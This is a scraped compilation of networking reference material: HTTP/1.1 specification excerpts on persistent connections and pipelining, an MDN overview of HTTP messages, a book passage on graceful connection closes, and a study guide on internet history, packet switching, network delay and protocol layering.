
   Prior to persistent connections, a separate TCP connection was
   established to fetch each URL, increasing the load on HTTP servers
   and causing congestion on the Internet. The use of inline images and
   other associated data often require a client to make multiple
   requests of the same server in a short amount of time. Analysis of
   these performance problems and results from a prototype
   implementation are available [26] [30]. Implementation experience and
   measurements of actual HTTP/1.1 (RFC 2068) implementations show good
   results [39]. Alternatives have also been explored, for example,
   T/TCP [27].

   Persistent HTTP connections have a number of advantages:

   HTTP implementations SHOULD implement persistent connections.

   A significant difference between HTTP/1.1 and earlier versions of
   HTTP is that persistent connections are the default behavior of any
   HTTP connection. That is, unless otherwise indicated, the client
   SHOULD assume that the server will maintain a persistent connection,
   even after error responses from the server.

   Persistent connections provide a mechanism by which a client and a
   server can signal the close of a TCP connection. This signaling takes
   place using the Connection header field (section 14.10). Once a close
   has been signaled, the client MUST NOT send any more requests on that
   connection.

   An HTTP/1.1 server MAY assume that a HTTP/1.1 client intends to
   maintain a persistent connection unless a Connection header including
   the connection-token "close" was sent in the request. If the server
   chooses to close the connection immediately after sending the
   response, it SHOULD send a Connection header including the
   connection-token close.

   An HTTP/1.1 client MAY expect a connection to remain open, but would
   decide to keep it open based on whether the response from a server
   contains a Connection header with the connection-token close. In case
   the client does not want to maintain a connection for more than that
   request, it SHOULD send a Connection header including the
   connection-token close.

   If either the client or the server sends the close token in the
   Connection header, that request becomes the last one for the
   connection.

   Clients and servers SHOULD NOT assume that a persistent connection is
   maintained for HTTP versions less than 1.1 unless it is explicitly
   signaled. See section 19.6.2 for more information on backward
   compatibility with HTTP/1.0 clients.

   In order to remain persistent, all messages on the connection MUST
   have a self-defined message length (i.e., one not defined by closure
   of the connection), as described in section 4.4.

   A client that supports persistent connections MAY "pipeline" its
   requests (i.e., send multiple requests without waiting for each
   response). A server MUST send its responses to those requests in the
   same order that the requests were received.

   Clients which assume persistent connections and pipeline immediately
   after connection establishment SHOULD be prepared to retry their
   connection if the first pipelined attempt fails. If a client does
   such a retry, it MUST NOT pipeline before it knows the connection is
   persistent. Clients MUST also be prepared to resend their requests if
   the server closes the connection before sending all of the
   corresponding responses.

   Clients SHOULD NOT pipeline requests using non-idempotent methods or
   non-idempotent sequences of methods (see section 9.1.2). Otherwise, a
   premature termination of the transport connection could lead to
   indeterminate results. A client wishing to send a non-idempotent
   request SHOULD wait to send that request until it has received the
   response status for the previous request.

   It is especially important that proxies correctly implement the
   properties of the Connection header field as specified in section
   14.10.

   The proxy server MUST signal persistent connections separately with
   its clients and the origin servers (or other proxy servers) that it
   connects to. Each persistent connection applies to only one transport
   link.

   A proxy server MUST NOT establish a HTTP/1.1 persistent connection
   with an HTTP/1.0 client (but see RFC 2068 [33] for information and
   discussion of the problems with the Keep-Alive header implemented by
   many HTTP/1.0 clients).

   Servers will usually have some time-out value beyond which they will
   no longer maintain an inactive connection. Proxy servers might make
   this a higher value since it is likely that the client will be making
   more connections through the same server. The use of persistent
   connections places no requirements on the length (or existence) of
   this time-out for either the client or the server.

   When a client or server wishes to time-out it SHOULD issue a graceful
   close on the transport connection. Clients and servers SHOULD both
   constantly watch for the other side of the transport close, and
   respond to it as appropriate. If a client or server does not detect
   the other side's close promptly it could cause unnecessary resource
   drain on the network.

   A client, server, or proxy MAY close the transport connection at any
   time. For example, a client might have started to send a new request
   at the same time that the server has decided to close the "idle"
   connection. From the server's point of view, the connection is being
   closed while it was idle, but from the client's point of view, a
   request is in progress.

   This means that clients, servers, and proxies MUST be able to recover
   from asynchronous close events. Client software SHOULD reopen the
   transport connection and retransmit the aborted sequence of requests
   without user interaction so long as the request sequence is
   idempotent (see section 9.1.2). Non-idempotent methods or sequences
   MUST NOT be automatically retried, although user agents MAY offer a
   human operator the choice of retrying the request(s). Confirmation by
   user-agent software with semantic understanding of the application
   MAY substitute for user confirmation. The automatic retry SHOULD NOT
   be repeated if the second sequence of requests fails.

   Servers SHOULD always respond to at least one request per connection,
   if at all possible. Servers SHOULD NOT close a connection in the
   middle of transmitting a response, unless a network or client failure
   is suspected.

   Clients that use persistent connections SHOULD limit the number of
   simultaneous connections that they maintain to a given server. A
   single-user client SHOULD NOT maintain more than 2 connections with
   any server or proxy. A proxy SHOULD use up to 2*N connections to
   another server or proxy, where N is the number of simultaneously
   active users. These guidelines are intended to improve HTTP response
   times and avoid congestion.

   HTTP/1.1 servers SHOULD maintain persistent connections and use TCP's
   flow control mechanisms to resolve temporary overloads, rather than
   terminating connections with the expectation that clients will retry.
   The latter technique can exacerbate network congestion.

   An HTTP/1.1 (or later) client sending a message-body SHOULD monitor
   the network connection for an error status while it is transmitting
   the request. If the client sees an error status, it SHOULD
   immediately cease transmitting the body. If the body is being sent
   using a "chunked" encoding (section 3.6), a zero length chunk and
   empty trailer MAY be used to prematurely mark the end of the message.
   If the body was preceded by a Content-Length header, the client MUST
   close the connection.

   The purpose of the 100 (Continue) status (see section 10.1.1) is to
   allow a client that is sending a request message with a request body
   to determine if the origin server is willing to accept the request
   (based on the request headers) before the client sends the request
   body. In some cases, it might either be inappropriate or highly
   inefficient for the client to send the body if the server will reject
   the message without looking at the body.

   Requirements for HTTP/1.1 clients:

   Because of the presence of older implementations, the protocol allows
   ambiguous situations in which a client may send "Expect: 100-
   continue" without receiving either a 417 (Expectation Failed) status
   or a 100 (Continue) status. Therefore, when a client sends this
   header field to an origin server (possibly via a proxy) from which it
   has never seen a 100 (Continue) status, the client SHOULD NOT wait
   for an indefinite period before sending the request body.

   Requirements for HTTP/1.1 origin servers:

   Requirements for HTTP/1.1 proxies:

   If an HTTP/1.1 client sends a request which includes a request body,
   but which does not include an Expect request-header field with the
   "100-continue" expectation, and if the client is not directly
   connected to an HTTP/1.1 origin server, and if the client sees the
   connection close before receiving any status from the server, the
   client SHOULD retry the request.  If the client does retry this
   request, it MAY use the following "binary exponential backoff"
   algorithm to be assured of obtaining a reliable response:

   If at any point an error status is received, the client

HTTP messages are how data is exchanged between a server and a client. There are two types of messages: requests sent by the client to trigger an action on the server, and responses, the answer from the server.HTTP messages are composed of textual information encoded in ASCII, and span over multiple lines. In HTTP/1.1, and earlier versions of the protocol, these messages were openly sent across the connection. In HTTP/2, the once human-readable message is now divided up into HTTP frames, providing optimization and performance improvements.Web developers, or webmasters, rarely craft these textual HTTP messages themselves: software, a Web browser, proxy, or Web server, perform this action. They provide HTTP messages through config files (for proxies or servers), APIs (for browsers), or other interfaces.The HTTP/2 binary framing mechanism has been designed to not require any alteration of the APIs or config files applied: it is broadly transparent to the user.HTTP requests, and responses, share similar structure and are composed of:The start-line and HTTP headers of the HTTP message are collectively known as the head of the requests, whereas its payload is known as the body.HTTP requests are messages sent by the client to initiate an action on the server. Their start-line contain three elements:HTTP headers from a request follow the same basic structure of an HTTP header: a case-insensitive string followed by a colon (':') and a value whose structure depends upon the header. The whole header, including the value, consist of one single line, which can be quite long.There are numerous request headers available. They can be divided in several groups:The final part of the request is its body. Not all requests have one: requests fetching resources, like GET, HEAD, DELETE, or OPTIONS, usually don't need one. Some requests send data to the server in order to update it: as often the case with POST requests (containing HTML form data).Bodies can be broadly divided into two categories:The start line of an HTTP response, called the status line, contains the following information:A typical status line looks like: HTTP/1.1 404 Not Found.HTTP headers for responses follow the same structure as any other header: a case-insensitive string followed by a colon (':') and a value whose structure depends upon the type of the header. The whole header, including its value, presents as a single line.There are numerous response headers available. These can be divided into several groups:The last part of a response is the body. Not all responses have one: responses with a status code, like 201 or 204, usually don't.Bodies can be broadly divided into three categories:HTTP/1.x messages have a few drawbacks for performance:HTTP/2 introduces an extra step: it divides HTTP/1.x messages into frames which are embedded in a stream. Data and header frames are separated, this allows header compression. Several streams can be combined together, a process called multiplexing, allowing more efficient underlying TCP connections.HTTP frames are now transparent to Web developers. This is an additional step in HTTP/2, between HTTP/1.1 messages and the underlying transport protocol. No changes are needed in the APIs used by Web developers to utilize HTTP frames; when available in both the browser and the server, HTTP/2 is switched on and used.HTTP messages are the key in using HTTP; their structure is simple and they are highly extensible. The HTTP/2 framing mechanism adds a new intermediate layer between the HTTP/1.x syntax and the underlying transport protocol, without fundamentally modifying it: building upon proven mechanisms.Get the latest and greatest from MDN delivered straight to your inbox.If you haven’t previously confirmed a subscription to a Mozilla-related newsletter you may have to do so. Please check your inbox or your spam filter for an email from us.
        © 2005-2018 Mozilla and individual contributors.Content is available under these licenses.
No credit card requiredConnection
management—particularly knowing when and how to close
connections—is one of the practical black arts of HTTP. This
issue is more subtle than many developers first realize, and little
has been written on the subject.
Any HTTP client, server, or proxy can close a TCP transport
connection at any time. The connections normally are closed at the
end of a message,[18] but during error
conditions, the connection may be closed in the middle of a header
line or in other strange places.
This situation is common with pipelined persistent connections. HTTP
applications are free to close persistent connections after any
period of time. For example, after a persistent connection has been
idle for a while, a server may decide to shut it down.
However, the server can never know for sure that the client on the
other end of the line wasn't about to send data at
the same time that the "idle"
connection was being shut down by the server. If this happens, the
client sees a connection error in the middle of writing its request
message.
Each HTTP response should have an accurate Content-Length header to
describe the size of the response body. Some older HTTP servers omit
the Content-Length header or include an erroneous length, depending
on a server connection close to signify the actual end of data.
When a client or proxy receives an HTTP response terminating in
connection close, and the actual transferred entity length
doesn't match the Content-Length (or there is no
Content-Length), the receiver should question the correctness of the
length.
If the receiver is a caching proxy, the receiver should not cache the
response (to minimize future compounding of a potential error). The
proxy should forward the questionable message intact, without
attempting to "correct" the
Content-Length, to maintain semantic transparency.
Connections can close at any time, even in non-error conditions. HTTP
applications have to be ready to properly handle unexpected closes.
If a transport connection closes while the client is performing a
transaction, the client should reopen the connection and retry one
time, unless the transaction has side effects. The situation is worse
for pipelined connections. The client can enqueue a large number of
requests, but the origin server can close the connection, leaving
numerous requests unprocessed and in need of rescheduling.
Side effects are important. When a connection closes after some
request data was sent but before the response is returned, the client
cannot be 100% sure how much of the transaction actually was invoked
by the server. Some transactions, such as GETting a static HTML page,
can be repeated again and again without changing anything. Other
transactions, such as POSTing an order to an online book store,
shouldn't be repeated, or you may risk multiple
orders.
A transaction is idempotent if it yields the
same result regardless of whether it is executed once or many times.
Implementors can assume the GET, HEAD, PUT, DELETE, TRACE, and
OPTIONS methods share this property.[19] Clients shouldn't
pipeline nonidempotent requests (such as POSTs). Otherwise, a
premature termination of the transport connection could lead to
indeterminate results. If you want to send a nonidempotent request,
you should wait for the response status for the previous request.
Nonidempotent methods or sequences must not be retried automatically,
although user agents may offer a human operator the choice of
retrying the request. For example, most browsers will offer a dialog
box when reloading a cached POST response, asking if you want to post
the transaction again.
TCP connections are bidirectional, as shown in Figure 4-19. Each side of a TCP connection has an input
queue and an output queue, for data being read or written. Data
placed in the output of one side will eventually show up on the input
of the other side.
Figure 4-19. TCP connections are bidirectionalAn application can close either or both of the TCP input and output
channels. A close( ) sockets call closes both the
input and output channels of a TCP connection. This is called a
"full close" and is depicted in
Figure 4-20a. You can use the shutdown(
) sockets call to close either the input or output channel
individually. This is called a "half
close" and is depicted in Figure 4-20b. 
Figure 4-20. Full and half closeSimple HTTP applications can use only full closes. But when
applications start talking to many other types of HTTP clients,
servers, and proxies, and when they start using pipelined persistent
connections, it becomes important for them to use half closes to
prevent peers from getting unexpected write errors.
In general, closing the output channel of your connection is always
safe. The peer on the other side of the connection will be notified
that you closed the connection by getting an end-of-stream
notification once all the data has been read from its buffer.
Closing the input channel of your connection is riskier, unless you
know the other side doesn't plan to send any more
data. If the other side sends data to your closed input channel, the
operating system will issue a TCP "connection reset
by peer" message back to the other
side's machine, as shown in Figure 4-21. Most operating systems treat this as a
serious error and erase any buffered data the other side has not read
yet. This is very bad for pipelined connections.
Figure 4-21. Data arriving at closed connection generates "connection reset by peer" errorSay you have sent 10 pipelined requests on a persistent connection,
and the responses already have arrived and are sitting in your
operating system's buffer (but the application
hasn't read them yet). Now say you send request #11,
but the server decides you've used this connection
long enough, and closes it. Your request #11 will arrive at a closed
connection and will reflect a reset back to you. This reset will
erase your input buffers.
When you finally get to reading data, you will get a connection reset
by peer error, and the buffered, unread response data will be lost,
even though much of it successfully arrived at your machine.
The HTTP specification counsels that when clients or servers want to
close a connection unexpectedly, they should "issue
a graceful close on the transport connection," but
it doesn't describe how to do that.
In general, applications implementing graceful closes will first
close their output channels and then wait for the peer on the other
side of the connection to close its output
channels. When both sides are done telling each other they
won't be sending any more data (i.e., closing output
channels), the connection can be closed fully, with no risk of reset.
Unfortunately, there is no guarantee that the peer implements or
checks for half closes. For this reason, applications wanting to
close gracefully should half close their output channels and
periodically check the status of their input channels (looking for
data or for the end of the stream). If the input channel
isn't closed by the peer within some timeout period,
the application may force connection close to save
resources.

[18] Servers shouldn't
close a connection in the middle of a response unless client or
network failure is suspected.[19] Administrators
who use GET-based dynamic forms should make sure the forms are
idempotent.No credit card required

You are in: 
 Paul Krzyzanowski  Latest update: Fri May  6 15:41:35 EDT 2016
 

Disclaimer: 
This study guide attempts to touch upon the most
important topics that may be covered on the exam but does not claim to
necessarily cover everything that one needs to know for the exam. Finally,
don't take the three hour time window in the title literally.Data communication, the process of conveying information from one place to another, existed
long before computers and dates back to earliest recorded history. As various pre-computer
techniques for conveying data reliably over distances were invented, so too were a number
of underlying mechanisms that proved to be useful in digital networks.The most basic form of message delivery is moving a message from one entity (person) to another.
This is known as point-to-point, or unicast delivery. Transmitting
a single message so that everyone gets it is known as a broadcast. It’s the
difference between a messenger and a smoke signal.
Two crucial categories of data are control and message data.
Message data is the information that needs to be delivered.
Control data comprises the information that is used to manage the delivery of the message. It
includes things such as acknowledgements, retransmission requests, and rate controls.
In some cases, control data is sent via a separate communication channel than message data. In
other cases, it is intermixed with some syntax for identifying which data is control and which is message.Synchronization, in the context of messaging, is the coordination of activity between
the sender and receiver of messages. It includes controls such as ready to send, ready
to receive, transmission complete.Congestion is the inability of a network element
to receive or transmit messages at the desired rate, leading to a
buildup or possibly a loss of messages and a deterioration in the
quality of service.
Flow control
is the aspect of synchronization that deals with the rate of transmission, controlling
when the sender transmits messages to keep the receiver or network from getting overwhelmed with
data traffic.
Rate control is the aspect of flow control that controls just the speed of
transmission.
Other elements of flow control may be directives to delay for a specific time or wait until
some feedback is received. By reducing the flow of traffic, congestion can be alleviated.An acknowledgement (also known as a positive acknowledgement)
is a control message that states that a message was received.
A negative acknowledgement is a control message that states that a message was not delivered
to the destination or that it was received with errors. It is a form of error notification.Packets may be lost or corrupted during transmission.
With best-effort message delivery the network does the best it can
do in providing service but
makes no guarantee that data will be delivered to its destination
or the time it will take for it to be delivered.
Reliable delivery ensures that data does arrive reliably. Reliable
delivery may be implemented as a layer of software on top of
a network that provides best-effort delivery. With reliable
delivery, if a message does not arrive or arrive correctly,
the transmitter will be notified and will attempt to resend the message.
Delivery time of the message can vary (since there is an extra delay to detect
lost data dnt to retranmit it). With flow control mechanisms to relieve
congestion as well as reliable delivery, there is generally no guarantee on
the resulting bit rate between two communicating parties.A key part of any communication is the encoding of data. This ranges from how data
is represented in the medium (the component that carries data, whether it is radio frequency, a wire,
or a piece of paper) to the meaning of the messages themselves. To expedite messaging in the past,
table-based encoding was sometimes used to have a letter or a number represent an entire message
instead of transmitting each character in the message. A repeater, also known as an extender,
is a device that regenerates a
signal to cover longer distances. Pre-networking, this would be a relay station where one would switch horses
or runners. These days, it is a often a device such as an ethernet extender that
regenerates incoming signals to full strength, allowing longer runs of ethernet cable.The precursor to the Internet was ARPANET, a research project funded by DARPA, the Defense
Advanced Research Projects Agency. This was an experiment in using packet switched networking
to share computing resources over long distances. ARPANET got its start in late 1968 and was
inspired by three developments. First, Leonard Kleinrock’s concept of packet switching:
breaking messages into small chunks called packets and have them compete
with packets from other messages on the same shared communication link. Second, J.C.R. Licklider’s
vision of an “Intergalactic Network”, a globally connected set of computers where you can
access data from or run programs on remote machines. Third, the demonstration of the viability
of a wide-area network accomplished by connecting a computer in Massachusetts to one in California
over a telephone line via a dial-up connection.The crucial component in the early ARPANET was the Interface
Message Processor, or IMP. This was the device that served
as the interface between one or more connected host computers and
the external packet-based ARPANET, processed the flow of packets,
and sent them to other IMPs or to a connected host . It was the
predecessor to the router. The ARPANET went live in 1969 with
two computers and two more by the end of the year. In the early
ARPANET, all the protocols for delivering packets were implemented
in the IMPs. The software that ran on the computer and interfaced
with the IMP was the Network Control Program, or NCP. This
allowed applications to interface with the network and provided
them with the abstraction of having a dedicated communication stream.
It also handled flow control to the IMP and retransmission. As the
ARPANET evolved, NCP became TCP, which handled reliable
application-to-application communication.ARPANET was designed to support the interconnection of networks (inter-networking).
It is a network of networks rather than a single network to which computers connect.
For an organization to join the ARPANET, there was no requirement for it to have a specific internal network.
This layer of networking would be a logical layer on top of any underlying physical network.Because there was no assumption on the design of any physical network, the ARPANET assumed that
communication is not guaranteed to be reliable. Instead, it would provide best effort packet delivery.
Software, originally NCP and later TCP, provided the ability to detect errors or lost packets and request retransmission.Routers connect the various individual networks and links together that make up the Internet.
While routers are crucial in determining where to send packets, they were designed to not store
information about the flow of packets. Any packet can be routed on its own with no a priori connection setup.Finally, the entire network is decentralized. There is no central administration or control point. This
aspect not only makes the network scalable (no single point of congestion) but aids in making it a fault
tolerant network. If a router is not working, it is likely that there may be alternate paths to the destination.The ARPANET clearly demonstrated the value of wide-area, hardware agnostic networking but access to it
was restricted to organizations working on U.S. Department of Defense projects. Other networks were
created to cater to non-defense communities and some of these, such as NSFNET and CSNET, also chose to use the
IP platform.NSFNET was a government funded (by the NSF, the National Science Foundation) network that
was created in 1985 to connect NSF-funded supercomputing centers.
It initially did permit commercial traffic on its networks.By the late 1980s, the NSF was looking for commercial partners who
would provide wide area networking services. A collection of these
partners removed any need for government funding. In 1990, the
ARPANET was decommisssioned and in 1995, the NFSNET backbone was
transitioned to commercial networks, leading to the Internet of
today.The Internet comprises the network edge and the network core. The
network core is the set of interconnected networks that provide
wide area connectivity to the customers of the network. The network
edge is the set of devices and local networks that connect to
the core network. Your computers, TV sets, thermostats, and local
network constitute a network edge. Your Internet service provider
and its Internet service provider are components of the network
core.A local area network, or LAN, is a data communication network
that covers a relatively small area, typically a building. It uses
a the same network access protocol and usually the
same transmission medium (e.g., Ethernet), allowing
message delivery without the need to route messages through
different networks. Devices that send
and receive messages on the network are called hosts or nodes.
These devices are peers, meaning that no device has more control
or coordination of the network than any other device. Any host can
initiate a data transfer with any other host on the LAN. LANs usually
exhibit very low latency and a high data rate: typically 10s to a gigabit per
second (Gbps) for wireless networks and a 1 gigabit per
second (Gbps) or more for wired connections (although speeds as high as 10
and 100 Gbps are available).Nodes connect to a local area
network with an adapter. These are usually integrated onto the
main circuit board but may be separate components, such as a USB
ethernet adapter. Another term for these is NIC,
which stands for Network Interface Controller.The physical data communication links that the adapter uses to send and
receive data are called media. Common examples are unshielded
twisted pair (UTP) copper wire (e.g., ethernet cable), radio
frequency (e.g., the 5 GHz frequency bands used by
802.11ac), coaxial cable (e.g., used by cable TV in the home and the
MoCA standard, multimedia over coax), and optical fiber (which is not commonly
used in the home).The other end of the media terminates at a switch or hub.
A hub is a device that acts as a central point for multiple LAN
cables. It takes any data that comes in one port and sends it to
all the other ports. A switch is similar to a hub but smarter.
It looks at incoming data and determines the port or ports on which
to transmit it. Switches have largely replaced hubs. They provide
scalable bandwidth in that they do not introduce more network
congestion as you add more hosts onto your LAN. Switches and hubs
are link-layer devices (more on that later). That is, they move ethernet packets
to their destination as opposed to relaying data between networks.
They are responsible for creating the physical network. For wireless
networks, a wireless access point serves as link-layer switch.The connection between the LAN and the Internet (via the Internet
Service Provider) is called the access network. A residential
gateway (a type of router) or access router connects a home
or office LAN to the Internet. A modem, which stands for
modulator/demodulator converts data between various analog
formats as needed by the underlying media. Think of a modem as
back-to-back NICs, each converting data to their type of media.
Modems are generally built into access routers. Examples of access
links are:The organization that provides Internet service to a customer is called an
Internet Service Provider (ISP). One ISP does not have
access links to every Internet user in the world so there are thousands of ISPs: approximately 12,700
worldwide; 7,000 in the U.S. (about 100 or so larger-sized ones and lots of tiny regional ones).
Most smaller ISPs that serve end users purchase Internet connectivity from other ISPs.
ISP networsk are categorized by tiers. There isn’t a formal definition
of what constitutes a tier but there are generally accepted conventions.At the very top of the hierarchy, Tier 1 ISPs own the infrastructure that forms
the backbone of the Internet. Each Tier 1 ISP has a peering agreement with every other
Tier 1 ISP. This means that they agree to forward and receive traffic from each other without charging
the other ISP for it. Tier 1 ISPs have access to the Internet routing table,
also known as the global routing table. What this means that they know the
top-level ISP to which any IP address should be sent. They also know which of their lower-tier ISPs
receive any given IP address. As such, there is no concept of a “default route” at this level. With
lower-tier ISPs, a router can give up if it does not know where a certain packet should go and
just send it to a higher-level ISP. Tier 1 ISPs do not pay for data transit.
 Examples of Tier 1 ISPs include AT&T, Verizon, CenturyLink, Level 3, Telefónica, and NTT. Tier 2 ISPs purchase data transit from Tier 1 ISPs and other Tier 2 ISPs but may also peer with other networks for
direct connectivity and cost saving. They may then resell Internet access.
Examples of Tier 2 ISPs include
Comcast, British Telecom, Vodafone, and Sprint Communications. Tier 3 ISPs occupy the lowest level and solely purchase Internet
transit from one or more Tier 1 and Tier 2 IPSs. A Tier 3 ISP will
typically provide coverage in a limited region of a country. Examples
of these are Powernet Global, and Excel.Net. They concentrate on
the retail and consumer markets.A packet will often pass through several networks en route to its destination, both within and between
ISPs. Each link terminates at a router which makes a decision on where the packet
should be delivered. Each transmission of a packet is called a hop.Within ISPs, edge routers are placed at the edge of an ISP’s network and
communicate with other networks. For larger organizations, an edge router may sit at the
edge of a customer’s network and connect to one or more ISPs.
A core router is a router that connects routes on the Internet backbone.
A core router may also be used in dispersed organizations to interconnect routers from
multiple locations.A network is inherently a shared resource. Lots of devices send and receive data on it.
How do we share the network without clobbering each other’s data?The most basic approach is to establish a dedicated connection from the source to the destination.
This is a physical circuit and is what was used in the early days of the phone
system: your phone line went to the central office where it connected to a patch cord that was
in turn connected to the wire of the person with whom you were speaking. The same stream of electrons
flowed from one end to the other. This is not a viable use of network resources. Moreover, we will
likely have multiple applications running on a machine and using the network. We need to find
a way to share network links.One way can share the medium is to have each party communicate on
different frequencies. This ability to transmit different data
simultaneously is called broadband communication.
Each transmission is assigned a frequency band: a portion of the
total bandwidth. Broadband communications uses
Frequency Division Multiplexing (FDM).
Note that bidirectional communication
on one channel is not possible: each sender-receiver set needs its
own frequency band. Cable TV is an example of broadband. An alternate method is to have everyone take turns in accessing the
medium. This is called baseband communication. Each device is allowed
full access to the medium’s bandwidth but only for a portion of time.
Each communication session is assigned a specific set of short, fixed-length time slots during which it
can transmit. This is called Time Division Multiplexing (TDM).
Time Division Multiplexing is an example of circuit switching.Both FDM and TDM are examples of circuit switching.
Circuit switching sets up a dedicated communication channel, similar to
a physical circuit.
The key difference from a physical circuit is that the effective bandwidth is lower than
the capacity of the medium since it is shared.
With Frequency Division Multiplexing, the available bandwidth is sliced into frequency ranges.
With Time Division Multiplexing, the available bandwidth is sliced into time slots.An althernate way of sharing a medium is to use
variable-size time slots with no scheduling on the transmitter’s
part. This is called packet switching.Circuit switching requires a connection setup (or circuit setup).
A control message is sent from the source to establish
a path (route) from the source to the destination. Every
switching element in the path agrees to the setup of the path and allocates the
appropriate time slots (and other resources, such as memory buffers). The originating
node is then informed that the connection is established and communication
can take place. The path and all the switching resources (e.g., time slices or frequency bands)
remain allocated to the communication session whether data is being sent or not.
All data travels along this predetermined path from the source to the destination.
When the communication is complete, the sender “releases” the circuit. This results
in the sending of another control message through the path informing routers to
de-allocate the resources they were using for the session.Benefits of circuit switching are that it offers constant latency and guaranteed bandwidth.
Another benefit is that data routing decisions do not have to be made for each message
that is transmitted. They
are made once at the start of the communication session. Data can flow through a router
without having to be stored first until a decision is made where and when to transmit it.
The downside of circuit switching is that each connection ties up bandwidth and switching resources whether
any data is being transmitted or not. Conversely, if a connection needs to transfer a
larger amount of data, it still needs to spread it over bandwidth given to it even
if the rest of the network is not being used at the moment.
In short, circuit switching does not use network resources efficiently. Each circuit is
allocated a fixed bandwidth whether it is used or not.With packet switching, a communication stream is broken into chunks of data called packets.
Each packet must contain a destination address in its message header.
The packets travel from the source node to their final destination via packet switches.
Routers and ethernet switches are examples of packet switches.
Routers are used to transmit packets between different
networks and switches are used to transmit packets within a local area network. Each packet switch
decides on the disposition of the packet (to what port it should be transmitted) based on the packet’s destination
address. There is no need to retain memory of a predefined route for a stream of packets that represents
a communication stream. In fact, there is no real concept of a communication stream because no
routes have to be set up and no resources need to be reserved ahead of time.
Because packet switching is designed for baseband networks, each packet has full use of the
network link. If there are no other packets transmitted on the network, a node may see its available
bandwidth approach the maximum capacity of the network link.Packet switched traffic is known as datagram service in contrast to circuit switched
virtual circuit service. Think of a datagram as a telegram or letter, where each message has to be
addressed individually and may take a different path through the network. Think of a virtual circuit
as a telephone call where the call is first set up but then gets an established route constant bandwidth
for its duration.Packet switching employs statistical multiplexing. Multiplexing means dividing
a communication channel among multiple data streams. With TDM’s circuit switching,
a communication channel was divided into fixed time slots per data stream. With packet switching,
we are still sharing the network but now using variable time slots. What this means is that
if a node has a lot of data to transmit and others do not then it can transmit large packets
(or a lot of smaller packets) and use more of the network. If a node has little to transmit, it
will use less of the network and more network capacity will be available for others.
Of course, there might be times when a node may have to wait longer for the network to be free.
If a lot of nodes have a lot of data to transmit, they will collectively have to wait longer to use
the network, some more than others.
Similarly, routers may end up queuing packets for a particular outbound port. This leads to
variable latency. Packet switching is characterized by variable bandwidth and variable latency.
With packet switching, an entire packet needs to be received by a router before it is
transmitted on an outgoing link. This is called store and forward delivery
and also contributes to network latency as we will see in our discusion on delay and throughput.Despite its variable bandwidth and variable latency, packet switching allows for far more
efficient use of the network than circuit switching and has no limit on the number of concurrent
communication sessions. Because, on average, applications do not use the network non-stop,
switching and link resources are wasted whenever data is not flowing on an established connection.
With packet switching, there is no such reservation of these resources and more streams can be accommodated
while providing the same bandwidth to applications.
Packet switching is the dominant means of data communication. The Internet is built around
packet switching.Throughout our discussions on networking, we will bring up units of measure.
The three crucial ones for us are the size of data, the speed at which it moves,
and the time that it takes for it to get somewhere.As a packet flows from its source to its ultimate destination, it goes through
multiple routers. Each router introduces a delay as does the transit of the packet over
the communication link.With packet switching, a packet must be fully received by a router before it can be
sent out. This is store and forward packet delivery.
To see how this contributes to overall delay, let us consider each link.
If data is transmitted at R bits per second and a packet is L bits
long, it takes L/R seconds to transmit a packet from one link to the next.
Since transmission on the next link will not start until the packet is received,
each link adds a delay of L/R seconds. With N links (there are N–1 routers or transmitters
but we also count the delay of the initial transmission),
we have a total delay of N(L/R) seconds.Network delay is due to four factors:Processing delay.
The processing delay is the computation that a router has to do to
examine the header, check for packet errors, figure out the outbound port (route), and
move data around. It is usually not a significant contributor to the overall delay
and consumes a few microseconds.Transmission delay.
The transmission delay is the time that it takes to get a complete packet out onto the network.
This is a function of the speed of the link (e.g., 1 Gbps) and the number of bits in the packet:
(packet size ÷ transmission speed). If the packet size is L and the
transmission rate is R, the transmission delay is L/R.Propagation delay.
The propagation delay is the time it actually takes the signal to move from one end of the medium to
the other. While we might transmit the bits onto the network at, say, 100 megabits per second, there
is a delay between the time that the signal is sent and the signal is received. This is the speed
of signal propagation in the medium. For electrical signals in unshielded twisted pair or
for light pulses in fiber optics, this value is approximately 2×108 m/s (about
67% of the speed of light in a vacuum). An
electrical signal propagates in air on a wireless network at approximately 3×108
m/s. Depending on the distance the packet needs to travel, the delay may be from a few nanoseconds
to a few tens of milliseconds. It might be considerably longer for satellite transmission due to the longer
distance covered.Queuing delay.
With packet based networks, we can only transmit one packet onto a link at a time. Any other packets
that need to go out on that link will need to wait in a queue. The queuing delay is a function
of the amount of bits that are ahead of the packet (number of packets × the size of each packet)
and the transmission rate of the outbound link. Queuing delay can vary a lot depending on how much
data traffic is flowing over any particular link. It is dependent on how much traffic arrives at
a router at approximately the same time that needs to go out on the same link and on how quickly the
router can transmit the data out (see transmission delay).One useful measure for estimating the likelihood of queuing delays is
traffic intensity.
Traffic intensity is the average packet transmission delay
(L/R; see transmission delay) multiplied by the average rate of packet arrival.
If the average rate of packet arrival is a, traffic intensity is La/R.
It is technically a unitless quantity since packets/second × bits/packet ÷ bits/second cancel out.
[Trivia - not on the exam: the unit of this measure is called an erlang and refers to the load
on a network.]If the traffic intensity is greater than one, that means that, on average, packets arrive faster than
they can be transmitted and the queue will keep growing without bound.
This assures us that the queue will eventually overflow
and packets will have to be dropped, leading to packet loss.If the traffic intensity is less than or equal to one, packets are arriving slower or at the
same speed that they are being transmitted. This does not mean that packets will never get queued up.
A number of packets may occasionally arrive in rapid succession — a burst — and will have to be queued.
As traffic intensity approaches one, the probability that there will be bursts of packets that need to
be enqueued increases drastically. Hence, as traffic intensity approaches 1, queuing delay starts
to increase dramatically. In some cases, this will lead to lost packets due to limited queue sizes (routers
have only a fixed amount of memory to devote to queues).The total delay for a node is the sum of the four delays we just mentioned: processing + queue +
transmission + propagation. The total delay for N links in a store-and-forward
network is simply N times that amount.Data networking is generally implemented as a stack of
several protocols – each responsible for a specific aspect of
networking. The OSI reference model defines seven layers
 of network protocols.The OSI reference model gives us a terminology to discuss and compare different
networks. Any specific network may not necessarily implement all these layers.
The Internet protocol stack relies on layers 1 through 4 (physical through transport)
but it is up to applications to implement and use session, presentation, and,
of course, application layers.A key aspect of this layering approach is that each layer only has to interact with the
corresponding layer on the other side. For example, an application talks to
another application. TCP on one system deals with issues of retransmission and
message acknowledgement by talking to the TCP layer on the remote system.
A layer also does not need to be aware of the implementation of layers above it or
below it: they are just data sources and data sinks.if we want to send an IP packet (layer 3) out on an Ethernet network
(layers 1 and 2), we need to send out an Ethernet packet (an Ethernet
NIC or transceiver knows nothing about IP). The
entire IP packet becomes the payload (data) of an Ethernet packet.
Similarly, TCP and UDP, layers above IP, have their own headers,
distinct from IP headers (they need a port number, for example).
A TCP or UDP packet is likewise treated simply as data by the IP layer.
